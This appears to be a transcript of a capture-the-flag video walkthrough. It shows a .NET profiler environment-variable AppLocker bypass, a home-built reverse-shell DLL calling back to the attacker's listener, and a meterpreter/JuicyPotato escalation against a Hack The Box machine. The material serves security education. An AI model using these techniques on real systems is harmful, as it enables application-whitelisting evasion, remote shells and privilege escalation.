 what's going on youtube this is ipsec me doing a technique video of something i want to include in the ethereal machine but i just didn't get time to so we created a addendum video that has a pretty cool app locker bypass so let's jump in let's start off by showing the bypass in action and then we'll step deeper and deeper on how it works until we end up creating our own dll so the first thing is we just need any random.net binary that is not blocked by app locker tz-sync is a common one it's time zone synchronization generally you won't block that binary from executing i don't even know if it allows you to pass any arguments into it so we're going to set a environment variable called core enable profiling to one and then execute the same program tz sync and now we have a message box that pops up titled injected and says please subscribe so what exactly happened there is we have a few environment variables set if we look we can see core enable profiling core profiler and this the length of characters is specific the actual ones don't matter so if we set this to be all a's it would still work and then we got profiler path which is just a dll so these three things will inject into any net program you run if we try like powershell which is also.net we see the same message box that gets popped up so this is different than the living off the land binaries because these you pass a program arguments and then take it down a unexpected path such as reg svcs which just accepts a dll this you don't have to pass the programming argument so you won't see like tz sync on the living off the lan binaries this is a new.net version 4 feature before.net version 4 the core profiler path had to be in the registry under hkey local machine i believe so regular users couldn't set it now in net version 4 they expanded it to environment variables and domain users can set them which enables this attack path so i first came across this reading a post on how to do the fighter machine from hack the box and this post doesn't really go into much of the code but does go into exactly how it works and what you want to set and they give you a really nice dll that will use at the end of the video to load meterpreter on a hack-to-box machine and then potato it to do a unintended exploit another good reading is if you just google sub t core profiler and go in his rss feed and search like core profiler we'll see a bunch of things so this is also a good read and then these dotnet articles are also good the one thing in this hack players article i do want to mention is they talk about a token sandbox is it sandbox inert maybe it got edited since i saw it but there was a token called sandbox inert and that is patched in like 2016. so since i can't even find where this was mentioned i won't even talk about it so if you want you can google that token essentially if it comes from a system process it's a bypass top locker but if your system you can bypass app locker anyways but before like 2016 or 2017 users could set that token so the next thing we want to go i guess is to do the actual coding so let's show this off by creating a reverse shell with this so we're going to do new project visual c empty project and then we're going to add a source file and this is going to be a c plus file and we'll call this rev shell and now we have to pull a reverse shell off of google so i'm going to go to google.com and google c plus reverse shell github windows and we're going to go to the very first result look at this reverse shell copy paste and we gotta set our ip address this will be our linux box that is listing so log in here um nc lvnp will listen on port 9001 because we always like going over 9000 and if config eats zero i am 172 16 10.90 so we can go back here and paste uh clip was not shared and now we have a lot so delete everything paste again make this a bit bigger so you can read it and set this to 172 1610 uh was it 90 190. 190 and port 9001 so we also want to change this from a executable to a dll so we don't need main we can just rename this to be rev shell and then we also actually before we do that let's compile this and make sure this reverse shell works because nothing's worse than going down a long path and then realizing it didn't work to begin with so let's take it from a 32-bit executable to a 64-bit dll first thing off we have a error message w socket a use w socket w uh let's google w socket a msdn let's see it's hoping to pull up the yeah we'll just try changing it to w socket w i was hoping to see if there's anything difference between these two but i doubt it okay it's compiled so now we can just execute this so we'll go in here double click on this go back to a cali box and we see the reverse shell did come back so we know that's good so let's turn this into a dll the first thing is void reverse shell and get rid of these arguments and now we have to create a header file so create a new item here header rename rev shell did void do camel casing or not i did rev shell okay and now we need dll main so let's create a new item c plus plus again dll main okay let's include windows.h and now we can just do bool when api dll main h instance um hnst dll d word board reason and then lp void lp reserved okay create that function create a switch the forward reason and now upon dll process attach we want to do rev shell and then we can do we need case and then case dll process detach we won't really do anything here we also need to include revshell.h save this i mistyped this there we go so now we should have a dll let's change this to release 64-bit and convert this to dll build solution we see it's compiled successfully let's copy this go in this directory and for ease of sake we'll just rename this to b.dll and copy this all the way up here so currently we can go back to my linux machine and see we don't have a reverse shell yet so let's go back to this command prompt and set um where's my history we'll do set core profiler path is equal to c colon users ipsec b.dll and now let's do time zone sync and if we go back to our cali box we have a dll or a reverse shell so that is exactly how this all works so let's see this in action against an actual hack-to-box machine so let's do it against ethereal so let's download the meterpreter reverse shell from them so let's go to hack players core profiler bypass scroll down to the github download this and then let's do ls in this directory we'll move downloads uh the latest one beryllium2 and we'll call this pleasesubscribe.dll okay so we got that dll there the next thing we have to do is set up the metasploit listener so let's do that we can do it here um we'll do msfdb run i have a habit of typing msf console which only starts metasploit msfdb run starts the database and then metasploit so trying in the habit of voice using this so we can do handler h handler dash h and we'll do capital h ton zero capital p uh we have to do port like 136. only 73 and 136 are allowed out of this firewall and then we can do dash p for payload windows x64 interpreter reverse tcp and now our handler is listening so let us go back and we have to do our uh sessions dash i1 kill exit uh it's been a long day so now we're back to normal ignore that shell that came in we'll do python 3 ethereal dot pi and now we have to copy the file over so we can use openssl to do that so if we go into our smb directory let's move please subscribe to our ssl because this has certificates to do the openssl thing so let's do opensl s server quiet key cert we want to do on port 73 and we'll call it please subscribe dll so now we have to download this this was in c colon dec program two let's just do a dir and i'll speed up the video i forget exactly the directory oh we have to spin up a um dns server impact it not impact it responder i done zero so if you're confused here watch the ethereal video essentially we're doing a command injection and getting a response back via dns because only two ports are open and the app locker policies only allow openssl to be executed or other programs can but openssl is the only one that could lead to a shell without doing some crazy app locker bypass like we're about to do so we have the directory want it is this open ssl dash v 1.1.0 so we can do c colon backslash program two backslash this i don't know what's going on there let's just type everything in a window below so we'll do c colon progret2 open ssl bin open ssl s client quiet connect 10 10 14 3 port 73 and we direct this to c colon backslash windows servicing packages please subscribe dll when you're doing any type of like dll injection or anything always try to put it in a windows directory there's a applocker bypass cheat sheet if you just google it on github you'll find it it has a bunch of directories you can try so let's run this command so i think that ran we can do a dir against this to see run this we see it's sent but it is zero in size so something went wrong so let's do this again open sl s server quiet key dot pem and let's copy and paste this again cmd please subscribe dll i don't think i did that correctly cmd paste enter there we go so i think now it has copied we can do this one more time to see do a dir and hopefully it says something greater than zero in size there we go 16384 that let's see if that's right lsla ssl please subscribe that does not look like it's going to be the right size so something happened let's try that copy again i have it down here cmd paste this in and hopefully this time it will be different size at least match up to what's on our linux box so apologies for the sloppy edit i made a typo in a little bit that set me back like 20 minutes so i'm cutting that part out so i just kept copying please subscribe until it got to the file size i wanted which was 93184 this way we get files on the box is really janky and sucks and not reliable but now we have please subscribe dll so we want to go back to the post here and start creating our um bat file they put it all in one i like doing the bat file because when you screw up you can just see what you screwed up instead of all in one command to do it blind so we'll do cmd set core profiling equal to one and we'll do it to let me edit our script we don't want to get disturbed with just random output so we can do cmd echo set course profiling to 1 to c colon users public desktop shortcuts a dot bat so i had done all this and was troubleshooting a lot and what i missed was the folder shortcuts so that's why i went back and cut out this video it's like 1am right now by me actually 1 15 in the morning so on saturday hoping to get this done on the same day i did ethereal but maybe i won't set this put it in a.bat cmd echo set the next one and this we have to edit so this is windows servicing packages please subscribe three dot dll that goes to the same location okay then cmd echo set ip 10 10 14 3 cmd echo set port is equal to 136 and then cmd tz echo dz sync and let's see if we get command execution cmd to this we have to nest it there we go so this cmd in my script just is an alias to cmd slash c so now we got meterpreter session two open if we do sessions we can see it is running as allen so session i2 shell who am i slash all we can see we have the sc impersonate privilege so let us try to do a rotted potato attack against it so my tty they're screwed up that's odd control z show the background of interpreter not my whole metasploit uh search roth uh would do potato and then use juicy potato and then this cos id is blocked because they try to block rotten potato and i think juicy potato came out after this machine so we can do juicy potato cls id if you want an explanation of all these cls ids you can watch my fighter video where we'll generate them as well let's see here we go windows 2016 let's just pick the first one set cls id set session to 2 set lhost ton 0 just in case it requires it i it says reflection so it shouldn't do it although it is so we gotta do set lhost ton zero set l port 136 show options and session two died or again session three run this again set session three we'll do set l host to 10 10 14 3 make sure that works let's try to run this it's waiting for privilege payload so let's try this one more time and then we'll try a different cls id probably sessions okay set session this is for show options set payload let's try windows x64 interpreter reverse tcp option stock let's run this there we go so now i got my interpreter session five back i think it was just not setting my um architecture to 64-bit because my handler is listening on 64-bit so once the script gives me access back we can begin and look if we're system so sessions there we go session i5 and then if we do shell users rupal cd desktop and root.text is actually encrypted if we do cipher c root.text we can see only rupal can decrypt it so in order to access this file we just have to migrate so if we migrate into something that rupa learns like this notepad uh notepad was not the correct thing to migrate into uh do we still have a shell we may have to do this all over cmd session six set session six run let's get our seventh shell when it comes back we're gonna do sessions dash i seven okay ps let's go for another one that rupal has i wonder if vmtools is kind let's see rupal conhost no we'll do cmd.exe 1596. can we migrate here does not look like it so something's going on with this box if you migrate into a process you will be that user and if you are that user you can then access the encrypted files session. try this one last time uh set session to 8. run this and we'll do the vm tools process am i getting should i be nope i should be doing this one not ppid so let's try vm oh that system rupal here we go four two six eight we'll try this one session i9 migrate and if we don't get in then you saw we had system on the box we'll call it a day there uh help do we have that session still session i9 ps yeah something really wonky's going on but if you did this and got this far try to migrate into a process by rupal and then see if you can read the flag that'll be it for me take care guys hope you enjoyed the app locker bypass later so i stopped recording and i got another session i tried to do a migrate and it actually went successfully this time so let's drop to a shell and we'll do it who am i we see a are rupal so if we do cd users cd drupal cd desktop and we can do powershell get content root.txt dot length and it's blocked by group policy um we can type root.txt and i'll hopefully be able to block this in video editing if not you see the flag there so that is the box and that is what happens if you um are the user that can decrypt it so take care guys and i will see you all next week